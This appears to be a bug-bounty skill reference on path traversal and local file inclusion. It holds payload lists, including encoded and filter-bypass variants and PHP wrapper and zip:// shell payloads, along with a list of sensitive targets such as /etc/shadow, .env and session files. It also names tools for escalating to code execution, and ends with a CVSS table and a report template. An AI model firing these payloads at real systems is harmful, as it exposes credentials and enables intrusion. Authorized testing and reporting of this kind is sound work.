# Payloads, Sensitive File Targets, Severity, and Report Template

## Basic traversal

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
......\windows\win.ini
......\windows\system32\drivers\etc\hosts
```

## Absolute path

```
/etc/passwd
/etc/shadow
C:\Windows\win.ini
```

## Nested (non-recursive filter bypass)

```
....//
..../
```

## Encoded

```
%2e%2e%2f
%2e%2e%5c
%252e%252e%252f
%252e%252e%255c
```

## Null byte / extension bypass (legacy runtimes only)

```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
```

## Server-specific

```
..;/..;/..;/etc/passwd          (Tomcat)
X-Original-URL: /admin/../../etc/passwd
X-Rewrite-URL: /admin/../../etc/passwd
```

## PHP wrappers

```
php://filter/convert.base64-encode/resource=index.php
php://input
zip://var/www/uploads/yourfile.zip%23shell.php
```

## Sensitive file targets

```
Linux:       /etc/passwd   /etc/shadow   /proc/self/environ
Windows:     win.ini   hosts   web.config
Application: .env   config.php   wp-config.php   application.properties
             settings.py   web.config
Logs:        /var/log/apache2/access.log   /var/log/nginx/access.log
             /var/log/httpd/access_log   /var/log/mail.log
PHP session: /var/lib/php/sessions/sess_<id>   /tmp/sess_<id>
```

## Tools

| Tool | Use |
|---|---|
| `ffuf` | Fast traversal-payload fuzzing across a wordlist, with response-content matching (`-mr`) to flag actual file content rather than just status codes |
| `php_filter_chain_generator` | Generates a working PHP filter chain to turn a read-only LFI into RCE without needing a file upload |
| Burp Intruder | Manual payload/encoding permutation testing with full control over each request |

---

## CVSS 3.1 quick reference for common path traversal findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| Arbitrary read of a generic/non-sensitive file | ~4.3–5.3 | Medium |
| Arbitrary read of `/etc/passwd`/`win.ini` (confirms the class, limited direct impact) | ~5.3–6.5 | Medium |
| Source code disclosure | ~6.5–7.5 | Medium–High |
| Credential disclosure (`.env`, config files with live secrets) | ~7.5–8.8 | High |
| Zip Slip / archive-extraction arbitrary file write, confirmed | ~8.1–9.1 | High–Critical |
| LFI escalated to RCE (log/session poisoning, PHP filter chain, `zip://`) | ~9.1–9.8 | Critical |
| Traversal "bypass" confirmed with no file content recovered | n/a | Not yet a finding — see validation gate in `SKILL.md` |

## Full report template

```markdown
**Title**: Path traversal in [exact endpoint] allows [actor] to [impact]

## Summary
2-3 plain sentences: the endpoint, the traversal/bypass mechanism, and
exactly what was read or written.

## Steps to Reproduce
1. Send: [exact request — method, path, headers, body]
2. Observe: [exact file content returned, or confirmation of a
   written file's location]
3. [If escalated] Show the chain step that achieved code execution
   and the command output it returned

## Proof of Concept
Request/response pair showing the actual file content (redact live
credentials found inside — describe what type of secret was present
rather than reproducing it verbatim) or the archive/extraction proof
for Zip Slip findings.

## Impact
An attacker can [exact action — read arbitrary files as the web
server user / write files to an arbitrary path / execute arbitrary
commands via the documented chain]. State precisely what was exposed
or achieved, not a generic "full system compromise" claim unless you
demonstrated execution.

## Suggested Fix
One or two sentences specific to this endpoint — e.g., "Resolve the
requested path to its canonical absolute form and verify it starts
with the intended base directory before opening it; reject any
request where it doesn't, rather than attempting to strip `../`
sequences via string replacement."

## Severity Assessment
CVSS 3.1: X.X ([Severity label]) — see table above for basis
```

### Tone notes

- Lead with what was actually read or written, not a path-traversal tutorial.
- Redact live secrets found during testing; describe their type and source instead of pasting them into the report.
- If you escalated to RCE, say explicitly that you stopped at minimal proof (one command's output) and did not go further — this is both true and reassuring to a triager.
- Distinguish clearly between "I read a sensitive-looking file" and "I confirmed code execution" — these are very different severities and should never be conflated in the title or summary.
- Keep it under ~600 words, consistent with the other skills in this set.
